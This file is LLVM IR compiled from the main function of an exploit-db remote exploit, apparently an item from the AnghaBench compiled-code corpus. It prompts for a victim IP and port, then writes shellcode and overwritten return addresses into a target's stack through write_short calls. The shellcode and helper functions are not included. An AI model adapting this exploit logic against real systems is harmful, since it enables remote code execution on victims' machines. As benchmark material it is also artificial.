; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_5519.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_5519.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [24 x i8] c"Usage: exploit ip port\0A\00", align 1
@ip = common dso_local global i8* null, align 8
@port = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [26 x i8] c"[+] Victim is : %s:%d...\0A\00", align 1
@.str.2 = private unnamed_addr constant [48 x i8] c"[+] Shellcode size : %d // located at : 0x%08x\0A\00", align 1
@scode = common dso_local global i64 0, align 8
@FBSD8_SCADDR = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [32 x i8] c"[+] EIP is located at : 0x%08x\0A\00", align 1
@FBSD8_ESP = common dso_local global i32 0, align 4
@FIRST_EBP = common dso_local global i32 0, align 4
@THIRD_EBP = common dso_local global i32 0, align 4
@SECOND_EBP = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [11 x i8] c"[+] Done.\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %7 = load i32, i32* %4, align 4
  %8 = icmp slt i32 %7, 3
  br i1 %8, label %9, label %11

9:                                                ; preds = %2
  %10 = call i32 @exit_(i32 1, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  br label %11

11:                                               ; preds = %9, %2
  %12 = load i8**, i8*** %5, align 8
  %13 = getelementptr inbounds i8*, i8** %12, i64 1
  %14 = load i8*, i8** %13, align 8
  store i8* %14, i8** @ip, align 8
  %15 = load i8**, i8*** %5, align 8
  %16 = getelementptr inbounds i8*, i8** %15, i64 2
  %17 = load i8*, i8** %16, align 8
  %18 = call i32 @atoi(i8* %17)
  store i32 %18, i32* @port, align 4
  %19 = load i8*, i8** @ip, align 8
  %20 = load i32, i32* @port, align 4
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.1, i64 0, i64 0), i8* %19, i32 %20)
  %22 = load i64, i64* @scode, align 8
  %23 = inttoptr i64 %22 to i8*
  %24 = call i32 @strlen(i8* %23)
  %25 = load i32, i32* @FBSD8_SCADDR, align 4
  %26 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.2, i64 0, i64 0), i32 %24, i32 %25)
  %27 = load i32, i32* @FBSD8_ESP, align 4
  %28 = load i32, i32* @FIRST_EBP, align 4
  %29 = mul nsw i32 %28, 4
  %30 = add nsw i32 %27, %29
  %31 = add nsw i32 %30, 4
  %32 = add nsw i32 %31, 2
  %33 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0), i32 %32)
  %34 = load i32, i32* @FBSD8_ESP, align 4
  %35 = load i32, i32* @THIRD_EBP, align 4
  %36 = mul nsw i32 %35, 4
  %37 = add nsw i32 %34, %36
  %38 = add nsw i32 %37, 2
  %39 = trunc i32 %38 to i16
  %40 = load i32, i32* @FIRST_EBP, align 4
  %41 = call i32 @write_short(i16 zeroext %39, i32 %40)
  %42 = load i32, i32* @FBSD8_SCADDR, align 4
  %43 = ashr i32 %42, 16
  %44 = trunc i32 %43 to i16
  %45 = load i32, i32* @SECOND_EBP, align 4
  %46 = call i32 @write_short(i16 zeroext %44, i32 %45)
  %47 = load i32, i32* @FBSD8_ESP, align 4
  %48 = load i32, i32* @THIRD_EBP, align 4
  %49 = mul nsw i32 %48, 4
  %50 = add nsw i32 %47, %49
  %51 = trunc i32 %50 to i16
  %52 = load i32, i32* @FIRST_EBP, align 4
  %53 = call i32 @write_short(i16 zeroext %51, i32 %52)
  store i32 0, i32* %6, align 4
  br label %54

54:                                               ; preds = %75, %11
  %55 = load i32, i32* %6, align 4
  %56 = load i64, i64* @scode, align 8
  %57 = inttoptr i64 %56 to i8*
  %58 = call i32 @strlen(i8* %57)
  %59 = icmp ult i32 %55, %58
  br i1 %59, label %60, label %78

60:                                               ; preds = %54
  %61 = load i32, i32* @FBSD8_SCADDR, align 4
  %62 = load i32, i32* %6, align 4
  %63 = add i32 %61, %62
  %64 = trunc i32 %63 to i16
  %65 = load i32, i32* @SECOND_EBP, align 4
  %66 = call i32 @write_short(i16 zeroext %64, i32 %65)
  %67 = load i64, i64* @scode, align 8
  %68 = load i32, i32* %6, align 4
  %69 = zext i32 %68 to i64
  %70 = add nsw i64 %67, %69
  %71 = inttoptr i64 %70 to i16*
  %72 = load i16, i16* %71, align 2
  %73 = load i32, i32* @THIRD_EBP, align 4
  %74 = call i32 @write_short(i16 zeroext %72, i32 %73)
  br label %75

75:                                               ; preds = %60
  %76 = load i32, i32* %6, align 4
  %77 = add i32 %76, 2
  store i32 %77, i32* %6, align 4
  br label %54

78:                                               ; preds = %54
  %79 = load i32, i32* @FBSD8_ESP, align 4
  %80 = load i32, i32* @THIRD_EBP, align 4
  %81 = mul nsw i32 %80, 4
  %82 = add nsw i32 %79, %81
  %83 = add nsw i32 %82, 2
  %84 = trunc i32 %83 to i16
  %85 = load i32, i32* @FIRST_EBP, align 4
  %86 = call i32 @write_short(i16 zeroext %84, i32 %85)
  %87 = load i32, i32* @FBSD8_ESP, align 4
  %88 = ashr i32 %87, 16
  %89 = trunc i32 %88 to i16
  %90 = load i32, i32* @SECOND_EBP, align 4
  %91 = call i32 @write_short(i16 zeroext %89, i32 %90)
  %92 = load i32, i32* @FBSD8_ESP, align 4
  %93 = load i32, i32* @THIRD_EBP, align 4
  %94 = mul nsw i32 %93, 4
  %95 = add nsw i32 %92, %94
  %96 = trunc i32 %95 to i16
  %97 = load i32, i32* @FIRST_EBP, align 4
  %98 = call i32 @write_short(i16 zeroext %96, i32 %97)
  %99 = load i32, i32* @FBSD8_ESP, align 4
  %100 = load i32, i32* @FIRST_EBP, align 4
  %101 = mul nsw i32 %100, 4
  %102 = add nsw i32 %99, %101
  %103 = add nsw i32 %102, 4
  %104 = add nsw i32 %103, 2
  %105 = trunc i32 %104 to i16
  %106 = load i32, i32* @SECOND_EBP, align 4
  %107 = call i32 @write_short(i16 zeroext %105, i32 %106)
  %108 = load i32, i32* @FBSD8_SCADDR, align 4
  %109 = ashr i32 %108, 16
  %110 = trunc i32 %109 to i16
  %111 = load i32, i32* @THIRD_EBP, align 4
  %112 = call i32 @write_short(i16 zeroext %110, i32 %111)
  %113 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i64 0, i64 0))
  ret i32 0
}

declare dso_local i32 @exit_(i32, i8*) #1

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @write_short(i16 zeroext, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
